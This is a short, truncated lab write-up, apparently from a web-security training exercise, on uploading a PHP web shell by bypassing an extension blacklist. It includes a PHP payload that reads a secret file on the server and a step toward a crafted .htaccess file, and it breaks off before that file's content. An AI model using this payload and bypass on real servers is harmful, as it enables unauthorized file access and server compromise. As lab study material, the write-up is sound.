# Lab 04 - Web shell upload via extension blacklist bypass

## Vulnerable image upload function

1. Login and upload photo

2. View photo in new tab and look at GET request /files/avatars/images.jpeg

3. Create exploit.php file
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

4. Upload exploit.php instead of image

5. We need to create .htaccess file to change server configuration

- filename '.htaccess'
- Content-Type text/plain
- paylaod 